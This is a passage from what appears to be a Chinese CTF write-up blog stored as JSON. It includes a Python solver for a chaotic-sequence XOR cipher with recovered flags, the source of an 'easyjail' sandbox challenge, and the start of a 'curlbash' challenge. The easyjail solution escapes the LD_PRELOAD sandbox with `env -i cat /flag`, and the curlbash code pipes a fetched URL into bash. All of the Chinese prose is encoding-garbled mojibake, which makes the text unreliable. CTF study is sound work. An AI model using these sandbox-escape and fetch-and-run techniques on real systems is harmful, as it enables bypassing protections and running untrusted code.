è§£ç©ºé—´å¤ªå¤§ï¼Œæ— æ³•å…¨éƒ¨æ‰“å°ã€‚&quot;)        print(f&quot;   æœªå”¯ä¸€ç¡®å®šçš„å¯†é’¥: &#123;unresolved_keys&#125;&quot;)        print(&quot;   è¯·è€ƒè™‘å¢åŠ æ›´å¤šçº¦æŸ&quot;)        sys.exit(1)    print(&quot;\\n==================== å¯èƒ½çš„ FLAG ====================&quot;)    # é€’å½’å‡½æ•°æ¥æ¢ç´¢æ‰€æœ‰å¯èƒ½çš„è§£    solution_count = 0    def solve(flag_body_idx, current_flag_bytes):        nonlocal solution_count        # å¦‚æœè§£å®Œäº†ï¼Œæ‰“å°        if flag_body_idx == len(flag_body_ct):            try:                # æ‰“å°å®Œæ•´çš„ flag                print(&quot;flag&#123;&quot; + current_flag_bytes.decode(&#x27;ascii&#x27;))                solution_count += 1            except UnicodeDecodeError:                pass  # å¿½ç•¥æ— æ•ˆçš„ (é ascii) flag            return        pos = flag_body_key_positions[flag_body_idx]        c_byte = flag_body_ct[flag_body_idx]        # éå†è¿™ä¸ªä½ç½®çš„æ‰€æœ‰å¯èƒ½æ€§        for k_guess in key_candidates[pos]:            pt_byte = c_byte ^ k_guess            # åº”ç”¨çº¦æŸ 3 (Printable Flag)            if pt_byte in PRINTABLE_BYTES:                solve(flag_body_idx + 1, current_flag_bytes + bytes([pt_byte]))    # å¼€å§‹é€’å½’    solve(0, b&#x27;&#x27;)    print(&quot;=====================================================&quot;)    print(f&quot;[*] æœç´¢å®Œæˆã€‚å…±æ‰¾åˆ° &#123;solution_count&#125; ç§ç¬¦åˆ &#x27;printable-flag&#x27; çº¦æŸçš„è§£ã€‚&quot;)    if solution_count == 0 and total_solutions &gt; 0:        print(&quot;[!] æœªæ‰¾åˆ°ç¬¦åˆ &#x27;printable&#x27; çº¦æŸçš„è§£ã€‚ä¹Ÿè®¸ flag åŒ…å«éæ‰“å°å­—ç¬¦ï¼Ÿ&quot;)if __name__ == &quot;__main__&quot;:    main()\nç”¨è¿™äº›é™åˆ¶ç­›é€‰æ‰å°½å¯èƒ½å¤šçš„å¯èƒ½æ€§åï¼Œæœ€åä»ç„¶æœ‰12ç§å¯èƒ½æ€§ä¸èƒ½æ’é™¤ï¼Œè‚‰çœ¼çœ‹ä¸€çœ‹æ‰¾åˆ°æœ€åƒflagçš„å°±å¥½äº†\n[*] æ­£åœ¨åŠ è½½å¯†æ–‡æ–‡ä»¶: ciphertext[*] å¯†æ–‡åŠ è½½æˆåŠŸï¼Œæ€»é•¿åº¦: 1048619 å­—èŠ‚[*] å‘¨æœŸ $p=4096$ã€‚æ¨æ–­: len(flag) = 37 å­—èŠ‚[*] &#x27;çº¦æŸ 2&#x27; å°†ä½¿ç”¨ä¸¤ä¸ªæ•°æ®èŒƒå›´:    - æš‚æ€å (slice1) èŒƒå›´: (172068, 524288)    - ç¨³å®š (slice2) èŒƒå›´: (524327, 1048615)[*] Flag ä¸»ä½“ (32 å­—èŠ‚) ä¾èµ–äº 32 ä¸ªå”¯ä¸€çš„å¯†é’¥å­—èŠ‚ã€‚[*] æ­£åœ¨åº”ç”¨â€œçº¦æŸ 1â€(å·²çŸ¥æ˜æ–‡)...[*] æ­£åœ¨åº”ç”¨â€œçº¦æŸ 2â€(Printable msg parts)...Filtering keys: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 32/32 [00:00&lt;00:00, 13249.53it/s][*] çº¦æŸåº”ç”¨å®Œæˆã€‚æ­£åœ¨æ£€æŸ¥å‰©ä½™å¯èƒ½æ€§...[!] è­¦å‘Š: å¯†é’¥ä½ç½® 6 ä»æœ‰ 2 ä¸ªè§£[!] è­¦å‘Š: å¯†é’¥ä½ç½® 7 ä»æœ‰ 2 ä¸ªè§£[!] è­¦å‘Š: å¯†é’¥ä½ç½® 8 ä»æœ‰ 3 ä¸ªè§£[*] æ€»å¯èƒ½æ€§ç©ºé—´: 12 ä¸ªè§£ã€‚==================== å¯èƒ½çš„ FLAG ====================flag&#123;Cngot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;Cnaot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;Cn`ot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;Chgot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;Chaot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;Ch`ot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;Engot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;Enaot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;En`ot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;Ehgot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;Ehaot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;Eh`ot1c_Sequ3nces_4lso_conv3rg3&#125;=====================================================[*] æœç´¢å®Œæˆã€‚å…±æ‰¾åˆ° 12 ç§ç¬¦åˆ &#x27;printable-flag&#x27; çº¦æŸçš„è§£ã€‚\næœ€æ­£ç¡®çš„åªèƒ½æ˜¯flag&#123;Chaot1c_Sequ3nces_4lso_conv3rg3&#125;è¿™ä¸ªã€‚\nè¡¥å……å³ä½¿å®Œå…¨æŠ›å¼ƒflagå‰é¢çš„éƒ¨åˆ†ï¼Œåªä»flagå¼€å§‹ä¹Ÿèƒ½å¤Ÿæ’é™¤å¤§éƒ¨åˆ†äº†ï¼Œå‰©ä¸‹å¤§çº¦200å¤šç§ï¼Œå†å€ŸåŠ©ä¸€ä¸‹ç²¾æ¹›çš„è‹±è¯­è¯­æ„Ÿï¼ˆä¾‹å¦‚è°·æ­Œç¿»è¯‘åœ¨æ‹¼é”™å•è¯æ—¶ä¼šçŒœæµ‹æ­£ç¡®çš„è¯ï¼‰å°±èƒ½æ‰¾åˆ°ã€‚å’Œå¦å¤–ä¸¤é“é¢˜çš„flagéƒ½æ˜¯éšæœºçš„åå…­è¿›åˆ¶æ•°ç›¸æ¯”ï¼Œè¿™ä¸€é¢˜å€’æ˜¯å¾ˆæœ‰æ„æ€ã€‚\nä»¥åŠåœ¨åšè¿™é¢˜çš„æ—¶å€™è™½ç„¶æƒ³åˆ°äº†å‘¨æœŸæ€§ï¼Œä½†æ˜¯ä¸€å¼€å§‹æ²¡è·‘é‚£1000ä¸ªç§å­çš„è¯•éªŒï¼Œå› ä¸ºé‚£ä»½ä»£ç è·‘ä¸€æ¬¡ç¡¬æ§æˆ‘å…­åˆ†é’Ÿã€‚åˆšå¼€å§‹æˆ‘ç”¨Geminiæä¾›çš„IC(Index of Coincidence)æµ‹è¯•ã€‚\nimport collectionsimport mathimport sysimport numpy as np# --- å¸¸é‡ ---CT_FILE = &#x27;ciphertext&#x27; # ä½ çš„å¯†æ–‡æ–‡ä»¶åMAX_PERIOD_GUESS_IC = 50  # IC æµ‹è¯•è¦æ£€æŸ¥çš„æœ€å¤§å‘¨æœŸPRINTABLE_IC_THEORY = 1.0 / len(string.printable) # çº¦ 0.01# --- è¾…åŠ©å‡½æ•° ---def calculate_ic(data):    &quot;&quot;&quot;    è®¡ç®—ä¸€æ®µå­—èŠ‚æ•°æ®çš„é‡åˆæŒ‡æ•° (IC)    &quot;&quot;&quot;    if not data or len(data) &lt; 2:        return 0.0    N = len(data)    counts = np.bincount(np.frombuffer(data, dtype=np.uint8), minlength=256)    numerator = np.sum(counts * (counts - 1))    denominator = N * (N - 1)    if denominator == 0:        return 0.0    return numerator / denominator# --- ä¸»è¦åˆ†æå‡½æ•° ---def find_period_ic(ct, known_printable_ic):    &quot;&quot;&quot;    ä½¿ç”¨é‡åˆæŒ‡æ•° (IC) çŒœæµ‹å‘¨æœŸ    &quot;&quot;&quot;    print(f&quot;\\n--- é‡åˆæŒ‡æ•° (IC) åˆ†æ (æµ‹è¯•å‘¨æœŸ 1 åˆ° &#123;MAX_PERIOD_GUESS_IC&#125;) ---&quot;)        random_ic = 1.0 / 256.0  # çº¦ 0.0039        print(f&quot;[*] ç†è®º IC (éšæœºæ•°æ®):   &#123;random_ic:.5f&#125;&quot;)    print(f&quot;[*] ç†è®º IC (Printable æ˜æ–‡): &#123;known_printable_ic:.5f&#125; (æˆ‘ä»¬çš„ç›®æ ‡)&quot;)        overall_ic = calculate_ic(ct)    print(f&quot;[*] â€œå¹²å‡€â€å¯†æ–‡çš„æ•´ä½“ IC: &#123;overall_ic:.5f&#125; (åº”æ¥è¿‘ 0.0039)&quot;)        if abs(overall_ic - random_ic) &gt; 0.001:        print(&quot;[!] è­¦å‘Š: æ•´ä½“ IC ä¸æ¥è¿‘éšæœºå€¼ã€‚&quot;)    print(&quot;\\n[+] å¼€å§‹é€ä¸ªæµ‹è¯•å‘¨æœŸï¼š&quot;)    print(&quot;---------------------------------------&quot;)    print(&quot; å‘¨æœŸ (é•¿åº¦) | å¹³å‡ IC å€¼&quot;)    print(&quot;---------------------------------------&quot;)    results = []        for period in range(1, MAX_PERIOD_GUESS_IC + 1):        columns = [bytearray() for _ in range(period)]        for i, byte in enumerate(ct):            columns[i % period].append(byte)                total_ic = 0.0        for col_data in columns:            total_ic += calculate_ic(col_data)                    avg_ic = total_ic / period        results.append((period, avg_ic))                # å¯»æ‰¾ä¸æ˜æ–‡ç†è®º IC å€¼æœ€æ¥è¿‘çš„        marker = &quot;&quot;        if avg_ic &gt; (known_printable_ic * 0.9): # å¦‚æœ IC è¾¾åˆ°äº†ç†è®ºå€¼çš„ 90%             marker = f&quot; &lt;&lt;-- é«˜å¯èƒ½æ€§ (æ¥è¿‘ &#123;known_printable_ic:.4f&#125;)&quot;                print(f&quot; &#123;period:&lt;11&#125; | &#123;avg_ic:.5f&#125;&#123;marker&#125;&quot;)    print(&quot;---------------------------------------&quot;)        if results:        best_period, best_ic = max(results, key=lambda item: item[1])        print(f&quot;\\n[*] IC åˆ†ææ¨æµ‹çš„æœ€å¯èƒ½å‘¨æœŸ: &#123;best_period&#125; (IC = &#123;best_ic:.5f&#125;)&quot;)    else:        print(&quot;\\n[*] IC åˆ†ææœªæ‰¾åˆ°æ˜æ˜¾çš„å‘¨æœŸã€‚&quot;)# --- ä¸»ç¨‹åº ---def main():    print(f&quot;[*] æ­£åœ¨åŠ è½½å¯†æ–‡æ–‡ä»¶: &#123;CT_FILE&#125;&quot;)    try:        with open(CT_FILE, &#x27;rb&#x27;) as f:            ct = f.read()        L_ct = len(ct)        print(f&quot;[*] å¯†æ–‡åŠ è½½æˆåŠŸï¼Œæ€»é•¿åº¦: &#123;L_ct&#125; å­—èŠ‚&quot;)    except FileNotFoundError:        print(f&quot;[!] é”™è¯¯: å¯†æ–‡æ–‡ä»¶ &#x27;&#123;CT_FILE&#125;&#x27; æœªæ‰¾åˆ°ã€‚&quot;)        sys.exit(1)            # --- 1. è®¡ç®—â€œå¹²å‡€â€æ•°æ®èŒƒå›´ ---    L_RANDOM_MSG_TOTAL = 1048576    L_RANDOM_PART1 = L_RANDOM_MSG_TOTAL // 2    L_KNOWN_PLAINTEXT_BYTES = 6 # (b&#x27;\\x00&#x27; + b&#x27;\\x00&#x27; + b&#x27;\\x00\\x00\\x00\\x00&#x27;)        L_flag = L_ct - L_RANDOM_MSG_TOTAL - L_KNOWN_PLAINTEXT_BYTES        if L_flag &lt; 0:        print(f&quot;[!] é”™è¯¯: å¯†æ–‡é•¿åº¦ &#123;L_ct&#125; å¤ªçŸ­ï¼Œä¸é¢„æœŸçš„æ˜æ–‡ç»“æ„ä¸ç¬¦ã€‚&quot;)        print(f&quot;[!] é¢„æœŸè‡³å°‘éœ€è¦ &#123;L_RANDOM_MSG_TOTAL + L_KNOWN_PLAINTEXT_BYTES&#125; å­—èŠ‚ã€‚&quot;)        sys.exit(1)            print(f&quot;[*] æ ¹æ®å¯†æ–‡é•¿åº¦æ¨æ–­: len(flag) = &#123;L_flag&#125; å­—èŠ‚&quot;)        L_CONTAMINANT_MID = L_flag + 2 # (b&#x27;\\x00&#x27; + flag + b&#x27;\\x00&#x27;)        # --- 2. æå–â€œå¹²å‡€â€æ•°æ® ---    slice1_start = 0    slice1_end = L_RANDOM_PART1        slice2_start = slice1_end + L_CONTAMINANT_MID    slice2_end = L_ct - 4 # æ’é™¤æœ«å°¾çš„ 4 ä¸ª null        ct_clean_1 = ct[slice1_start : slice1_end]    ct_clean_2 = ct[slice2_start : slice2_end]        ct_to_test = ct_clean_1 + ct_clean_2        L_clean = len(ct_to_test)        print(f&quot;[*] æå–çš„â€œå¹²å‡€â€å¯†æ–‡å— 1: å­—èŠ‚ 0 åˆ° &#123;slice1_end&#125;&quot;)    print(f&quot;[*] æå–çš„â€œå¹²å‡€â€å¯†æ–‡å— 2: å­—èŠ‚ &#123;slice2_start&#125; åˆ° &#123;slice2_end&#125;&quot;)    print(f&quot;[*] ç”¨äº IC åˆ†æçš„æ€»æ•°æ®é‡: &#123;L_clean&#125; å­—èŠ‚ (åº”ä¸º &#123;L_RANDOM_MSG_TOTAL&#125;)&quot;)    if L_clean != L_RANDOM_MSG_TOTAL:        print(f&quot;[!] è­¦å‘Š: æå–çš„â€œå¹²å‡€â€æ•°æ®é•¿åº¦ (&#123;L_clean&#125;) ä¸é¢„æœŸçš„ &#123;L_RANDOM_MSG_TOTAL&#125; ä¸ç¬¦ï¼&quot;)            # --- 3. æ‰§è¡Œ IC åˆ†æ ---    # è®¡ç®— printable é›†åˆçš„ç†è®º IC å€¼    import string    printable_bytes = set(string.printable.encode(&#x27;ascii&#x27;))    # å‡è®¾ &#x27;printable&#x27; ä¸­çš„ 100 ä¸ªå­—ç¬¦æ˜¯å‡åŒ€åˆ†å¸ƒçš„    # å®é™…åˆ†å¸ƒå¯èƒ½ä¸å‡ï¼Œä½† 1/100 æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„è¿‘ä¼¼å€¼    printable_ic_estimate = 1.0 / len(printable_bytes)         find_period_ic(ct_to_test, printable_ic_estimate)        print(&quot;\\n--- åˆ†æå®Œæˆ ---&quot;)    print(&quot;è¯·æŸ¥çœ‹ IC åˆ†æä¸­ IC å€¼&#x27;å¼‚å¸¸é«˜&#x27;ï¼ˆæ¥è¿‘ ~0.01ï¼‰çš„å‘¨æœŸã€‚&quot;)    print(&quot;è¿™ä¸ªæ•°å­—å°±æ˜¯å¯†é’¥çš„å‘¨æœŸé•¿åº¦ã€‚&quot;)if __name__ == &quot;__main__&quot;:    main()\nå¦‚æœå‘¨æœŸä¸å¯¹ï¼Œé‚£ä¹ˆæ¯ä¸ªå¯†æ–‡å¯¹åº”çš„å¯†é’¥ä¸åŒï¼Œå¯†æ–‡åˆ†å¸ƒåº”è¯¥åœ¨0x00åˆ°0xFFå‡ç­‰ï¼Œä¹Ÿå°±æ˜¯é‡åˆæŒ‡æ•°åº”è¯¥åœ¨$\\frac{1}{256}\\approx0.00391$ï¼Œå‘¨æœŸå¯¹çš„è¯å¯†æ–‡æ¥è‡ªå¯æ‰“å°å­—ç¬¦å¼‚æˆ–åŒä¸€ä¸ªæ•°ï¼Œç”±äºå¯æ‰“å°å­—ç¬¦çš„èŒƒå›´è¾ƒå°ï¼Œåªæœ‰100ç§ï¼Œå› æ­¤å¯†æ–‡èŒƒå›´ä¹Ÿè¾ƒå°ï¼Œé‡åˆæŒ‡æ•°çº¦ä¸º$\\frac{1}{100}=0.01$ï¼Œå°†è¿œè¿œå¤§äºå‘¨æœŸä¸å¯¹çš„æƒ…å†µã€‚æˆ‘å¶ç„¶å‘ç°2çš„å¹‚æ¬¡å¯¹åº”çš„é‡åˆæŒ‡æ•°éƒ½æ ¼å¤–é«˜ï¼Œäºæ˜¯ä¸¥é‡æ€€ç–‘å‘¨æœŸæ˜¯2çš„è‹¥å¹²æ¬¡æ–¹ã€‚\nç„¶åç”¨2çš„å¹‚æµ‹ICï¼Œå‘ç°2048å’Œ4096éƒ½å‡ ä¹è¾¾åˆ°1ï¼Œ2048è¿˜é«˜ä¸€äº›ã€‚æˆ‘é—®Geminiä¸ºä»€ä¹ˆè¾¾ä¸åˆ°1ï¼Œå®ƒè·Ÿæˆ‘è¯´åœ¨è¿›å…¥å‘¨æœŸä¹‹å‰ä¼šæœ‰ä¸€æ®µæš‚æ€ï¼Œè¿™éƒ¨åˆ†ä¸åº”åŠ å…¥è®¡ç®—ã€‚äºæ˜¯å®ƒå»æ‰äº†å‰75%ï¼Œç»ˆäºçœ‹åˆ°æ¥è¿‘0.01äº†â€”â€”ä½†æ˜¯æ›´å¤§çš„å‘¨æœŸICæ›´é«˜ï¼Œ131072ç”šè‡³è¶…è¿‡äº†0.01ï¼Œæˆ‘æ²¡æ•¢ä¿¡ã€‚äºæ˜¯æˆ‘å»æƒ³åˆ«çš„éªŒè¯å‘¨æœŸçš„æ–¹æ¡ˆï¼Œå°±èŠ±äº†å¥½å‡ ä¸ªå…­åˆ†é’Ÿï¼Œè·‘ä¸åŒçš„ç§å­ã€‚ä¸è¿‡è¿˜å¾—æ„Ÿè°¢è¿™æ®µç»å†ï¼Œè¦ä¸ç„¶æˆ‘åˆ°æ­»éƒ½æƒ³ä¸åˆ°ä¸ºä»€ä¹ˆå‘¨æœŸæ˜æ˜æ˜¯4096ï¼Œä½†æ˜¯æŒ‰ç…§4096åˆ‡ç‰‡å´æ‰¾ä¸åˆ°keyä½¿å¾—æ¯ä¸€ä½éƒ½æ˜¯å¯æ‰“å°å­—ç¬¦ã€‚ç»“è®ºæ˜¯æœ€å¼€å§‹é‚£ä¸€æ®µå°±è¯¥æ‰”æ‰ã€‚\nä»¥åŠè¿™ä¸ªæ··æ²Œç†è®ºéƒ½æ˜¯2008å¹´çš„ä¸œè¥¿äº†ï¼Œåä¸ºæ¯æœ‰ç‚¹è€å•Šã€‚\nåè®°æœ€è¿‘æ¯”èµ›æœ‰ç‚¹å¤šï¼Œå¼ºç½‘æ¯åšå‡º0é“ï¼Œå¼ºç½‘æ‹Ÿæ€æŠ„ç½‘ä¸Šçš„æ¨¡æ¿åšäº†ä¸€é“ï¼Œç€å®æœ‰äº›é“å¿ƒç ´ç¢äº†ï¼Œæ„Ÿè§‰è‡ªå·±æœ‰ç‚¹æ²¡å…¥é—¨å¯†ç å­¦hhhï¼Œä½†æ˜¯å³ä½¿è‡ªå·±å°±è¿™æ°´å¹³ï¼Œä¹Ÿå·²ç»ç®—æ˜¯é˜Ÿä¼é‡ŒåŠä¸ªä¸»åŠ›äº†ï¼Œæ€ä¹ˆä¼šè¿™æ ·å‘¢ï¼ˆï¼‰å¤šå­¦å§ï¼Œå¹»å¤œå­é›¨èœèœçš„ã€‚\n","tags":["Writeup","2025","åä¸ºæ¯"]},{"title":"2025 SUSCTFé¢˜è§£","url":"/2025/10/09/2025%20SUSCTF%E9%A2%98%E8%A7%A3/","content":"å‰è¨€åˆæ¥æ‰“æˆ‘ä»¬å­¦æ ¡çš„æ¯”èµ›äº†ï¼Œåœ¨ä¸€å¹´çš„å­¦ä¹ ä¹‹åï¼Œæ„Ÿè§‰è‡ªå·±å¼ºäº†ä¸€ç‚¹ï¼Œä¸è¿‡ä¸»è¦æ˜¯å› ä¸ºä»Šå¹´æ²¡ä»€ä¹ˆç ”ç©¶ç”Ÿå¸ˆå‚…ä¸€èµ·ç«æŠ€ï¼ŒåŸæ¥å»å¹´æ‰æ˜¯ç‰¹ä¾‹å•Šã€‚\n\nä»¥åŠè™½ç„¶æ²¡æœ‰å¾ˆå¤šç ”ç©¶ç”Ÿå¤§ä½¬ï¼Œä½†æ˜¯ä»Šå¹´æœ‰æ–°ç”Ÿå¤§ä½¬ï¼Œå¾ˆéš¾æƒ³è±¡å¤§ä¸€æ–°ç”Ÿä¹Ÿèƒ½æ’åˆ°æ¦œé‡Œé ä¸Šçš„ä½ç½®ï¼Œæˆ‘ä»¬è¿™äº›å‰æµªè¦è¢«æ‹æ­»åœ¨æ²™æ»©ä¸Šäº†ã€‚\nå®˜æ–¹wpå·²ç»å‘å¸ƒåœ¨https://seusus.com/susctf-2025-official-writeup\næ­£æ–‡miscæˆ‘æœ¬æ˜¯miscæ‰‹ï¼Œä½†æ˜¯è¿™å›¢miscä¸€ç‚¹éƒ½ä¸ä¼šã€‚Questionnaireæ˜¯æ¯”èµ›çš„é—®å·ï¼Œè·³è¿‡ã€‚\neasyjail##################main.pyimport subprocessimport osimport hashlibimport requestsROOT = &quot;/app&quot;TEST_SCRIPT_PATH = &quot;testscript.sh&quot;def hash_file(path):    h = hashlib.sha256()    with open(path, &quot;rb&quot;) as f:        while chunk := f.read(8192):            h.update(chunk)    return h.hexdigest()def snapshot_directory(*paths):    file_hashes = &#123;&#125;    for path in paths:        for root, dirs, files in os.walk(path):            for f in files:                full_path = os.path.join(root, f)                try:                    file_hashes[full_path] = hash_file(full_path)                except Exception:                    pass    return file_hashesdef fetch(url):    r = requests.get(url)    r.raise_for_status()    return r.textdef write_script_to_chroot(script_path, script_content):    content = &quot;readonly LD_PRELOAD\\n&quot; + script_content    script_file = os.path.join(ROOT, script_path)    with open(script_file, &quot;w&quot;) as f:        f.write(content)    os.chmod(script_file, 0o755)def run_bash_script_sandbox(script_path):    script_path = os.path.join(ROOT, script_path)    env = &#123;&quot;LD_PRELOAD&quot;: &quot;./override.so&quot;&#125;    sandbox_cmd = [&quot;bash&quot;, &quot;-re&quot;, script_path]    result = subprocess.run(sandbox_cmd, capture_output=True, text=True, env=env)    return resultdef main():    url = input(&quot;Your script: &quot;)    s = fetch(url)    write_script_to_chroot(TEST_SCRIPT_PATH, s)    # Snapshot root filesystem before running script    root_snapshot_before = snapshot_directory(ROOT, &quot;/tmp&quot;, &quot;/dev/shm&quot;)    # Run script sandboxed    result = run_bash_script_sandbox(TEST_SCRIPT_PATH)    print(&quot;Script stdout:&quot;, result.stdout)    print(&quot;Script stderr:&quot;, result.stderr)    print(&quot;Exit code:&quot;, result.returncode)    if result.returncode != 0:        print(&quot;Ah-oh exit code. You fail!&quot;)        exit(1)    # Snapshot root filesystem after running script    root_snapshot_after = snapshot_directory(ROOT, &quot;/tmp&quot;, &quot;/dev/shm&quot;)    # Compare snapshots for any changes    changed_files = []    for fpath, hsh in root_snapshot_before.items():        if fpath in root_snapshot_after:            if root_snapshot_after[fpath] != hsh:                changed_files.append(fpath)        else:            changed_files.append(fpath + &quot; (deleted)&quot;)    new_files = [f for f in root_snapshot_after if f not in root_snapshot_before]    if not changed_files and not new_files:        print(&quot;No disk files were modified by the script. Good!&quot;)    else:        print(f&quot;Files changed: &#123;changed_files&#125;&quot;)        print(f&quot;New files: &#123;new_files&#125;&quot;)        print(&quot;Some disk files were modified. You fail.&quot;)        exit(1)if __name__ == &quot;__main__&quot;:    main()\n##################override.c#define _POSIX_C_SOURCE 200809L#include &lt;arpa/inet.h&gt;#include &lt;dlfcn.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;linux/openat2.h&gt;#include &lt;netinet/in.h&gt;#include &lt;stdarg.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/types.h&gt;typedef int (*open_func_t)(const char *, int, ...);typedef int (*openat_func_t)(int, const char *, int, ...);typedef int (*openat2_func_t)(int, const char *, struct open_how *, size_t);typedef int (*io_uring_setup_t)(unsigned int, void *);typedef int (*io_uring_enter_t)(unsigned int, unsigned int, unsigned int,                                unsigned int, void *);typedef int (*connect_func_t)(int, const struct sockaddr *, socklen_t);int open(const char *pathname, int flags, ...) &#123;  static open_func_t real_open = NULL;  if (!real_open) &#123;    real_open = (open_func_t)dlsym(RTLD_NEXT, &quot;open&quot;);  &#125;  if (pathname &amp;&amp; strstr(pathname, &quot;flag&quot;) != NULL) &#123;    errno = EPERM;    return -1;  &#125;  if ((flags &amp; O_PATH) == O_PATH) &#123;    errno = EPERM;    return -1;  &#125;  mode_t mode = 0;  if (flags &amp; O_CREAT) &#123;    va_list args;    va_start(args, flags);    mode = va_arg(args, mode_t);    va_end(args);    return real_open(pathname, flags, mode);  &#125;  return real_open(pathname, flags);&#125;int openat(int dirfd, const char *pathname, int flags, ...) &#123;  static openat_func_t real_openat = NULL;  if (!real_openat) &#123;    real_openat = (openat_func_t)dlsym(RTLD_NEXT, &quot;openat&quot;);  &#125;  if (pathname &amp;&amp; strstr(pathname, &quot;flag&quot;) != NULL) &#123;    errno = EPERM;    return -1;  &#125;  if ((flags &amp; O_PATH) == O_PATH) &#123;    errno = EPERM;    return -1;  &#125;  mode_t mode = 0;  if (flags &amp; O_CREAT) &#123;    va_list args;    va_start(args, flags);    mode = va_arg(args, mode_t);    va_end(args);    return real_openat(dirfd, pathname, flags, mode);  &#125;  return real_openat(dirfd, pathname, flags);&#125;int openat2(int dirfd, const char *pathname, struct open_how *how,            size_t size) &#123;  typedef int (*openat2_func_t)(int, const char *, struct open_how *, size_t);  static openat2_func_t real_openat2 = NULL;  if (!real_openat2) &#123;    real_openat2 = (openat2_func_t)dlsym(RTLD_NEXT, &quot;openat2&quot;);  &#125;  if (pathname &amp;&amp; strstr(pathname, &quot;flag&quot;) != NULL) &#123;    errno = EPERM;    return -1;  &#125;  if ((how-&gt;flags &amp; O_PATH) == O_PATH) &#123;    errno = EPERM;    return -1;  &#125;  return real_openat2(dirfd, pathname, how, size);&#125;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) &#123;  static connect_func_t real_connect = NULL;  if (!real_connect) &#123;    real_connect = (connect_func_t)dlsym(RTLD_NEXT, &quot;connect&quot;);  &#125;  if (addr-&gt;sa_family == AF_INET &amp;&amp; addrlen &gt;= sizeof(struct sockaddr_in)) &#123;    struct sockaddr_in new_addr = *(struct sockaddr_in *)addr;    new_addr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);    return real_connect(sockfd, (struct sockaddr *)&amp;new_addr, addrlen);  &#125;  errno = EAFNOSUPPORT;  return -1;&#125;int io_uring_setup(unsigned int entries, void *params) &#123;  errno = EPERM;  return -1;&#125;int io_uring_enter(unsigned int fd, unsigned int to_submit,                   unsigned int min_complete, unsigned int flags, void *sig) &#123;  errno = EPERM;  return -1;&#125;\n##################run.sh#!/bin/shif [ -z &quot;$GZCTF_FLAG&quot; ]; then    export GZCTF_FLAG=&quot;susctf&#123;testflag&#125;&quot;fiecho &quot;$GZCTF_FLAG&quot; &gt;/flagexport GZCTF_FLAG=&quot;&quot;echo &quot;Blocked by ctf_xinetd&quot; &gt;/etc/banner_failchmod 444 /flaginetd -fsleep infinity\nmain.pyæ˜¯ä¸»è¦çš„äº¤äº’éƒ¨åˆ†ï¼Œå®ƒä»æˆ‘ä»¬è¾“å…¥çš„urlä¸Šè·å–è„šæœ¬ï¼Œåœ¨ä¸€ä¸ªæœ‰é™åˆ¶çš„æ²™ç®±ä¸­è¿è¡Œï¼Œå¹¶ç»™å‡ºè¾“å‡ºæµã€é”™è¯¯æµå’Œé€€å‡ºä»£ç ã€‚æœ€åæ£€æŸ¥æ ¹ç›®å½•ã€/tmpå’Œ/dev/shmä¸‹æœ‰æ²¡æœ‰æ–‡ä»¶è¢«æ”¹å˜ï¼Œå¹¶å‘ŠçŸ¥ç”¨æˆ·ã€‚\næ²™ç®±ä¸­è°ƒæ•´äº†openï¼Œopenatå’Œopenat2ï¼Œæ‰“å¼€çš„æ–‡ä»¶åä¸èƒ½åŒ…å«â€flagâ€ï¼Œæ ‡å¿—flagä¸­ä¸èƒ½åŒ…å«O_PATHä½ï¼Œå› æ­¤æ— æ³•è¯»å–æ ¹ç›®å½•çš„/flagæ–‡ä»¶ï¼Œä¹Ÿä¸èƒ½è·å–æ–‡ä»¶æè¿°ç¬¦ã€‚åŒæ—¶ï¼Œæ²™ç®±æ§åˆ¶äº†æ‰€æœ‰çš„ç½‘ç»œè¿æ¥ï¼Œå¯¹äºipv4ï¼Œå°†ç›®æ ‡åœ°å€å¼ºåˆ¶è®¾ç½®ä¸º127.0.0.1ï¼›å¯¹äºéipv4çš„è¿æ¥ï¼Œåˆ™ç›´æ¥æŠ¥é”™ï¼Œå› æ­¤ä¸èƒ½å¤Ÿåˆ©ç”¨ç½‘ç»œå‘å¤–ä¼ è¾“ä¿¡æ¯ã€‚æœ€åï¼Œå®ƒç¦ç”¨äº†io_uringï¼Œä¸èƒ½ä½¿ç”¨è¿™ä¸ªI/Oæ¥å£ã€‚\nä¸è¿‡å¹¸è¿çš„æ˜¯ï¼Œsubprocess.run(sandbox_cmd, capture_output=True, text=True, env=env)è¡¨æ˜å¯¹äºæ²™ç®±çš„é™åˆ¶éƒ½å†™åœ¨envç¯å¢ƒå˜é‡ä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ‰§è¡Œä¸€ä¸ªä¸åŒ…å«è¿™ä¸ªç¯å¢ƒå˜é‡çš„è¿›ç¨‹ï¼Œåœ¨æ–°çš„è¿›ç¨‹ä¸­è¯»å–flagã€‚\nå®é™…ä»£ç å¦‚ä¸‹ï¼šenv -i cat /flag ã€‚å…¶ä¸­-iå‚æ•°è¡¨ç¤ºå¿½ç•¥ç¯å¢ƒå˜é‡ï¼Œå› æ­¤å¯ä»¥æ‰§è¡Œcat /flagã€‚å°†è„šæœ¬å­˜å‚¨åœ¨å¯è¢«æœåŠ¡å™¨è¯»å–çš„åœ°æ–¹ï¼ˆå¦‚pastebin.comï¼‰ï¼Œå¹¶è®©æœåŠ¡å™¨æ‰§è¡Œå³å¯ã€‚\n\ncurlbashimport subprocessimport osimport hashlibimport requestsROOT = &quot;/app&quot;TEST_SCRIPT_PATH = &quot;testscript.sh&quot;CURLBASH = &quot;&quot;&quot;#!/bin/bashcurl -fsSL &#123;url&#125; | bash -re&quot;&quot;&quot;def hash_file(path):    h = hashlib.sha256()    with open(path, 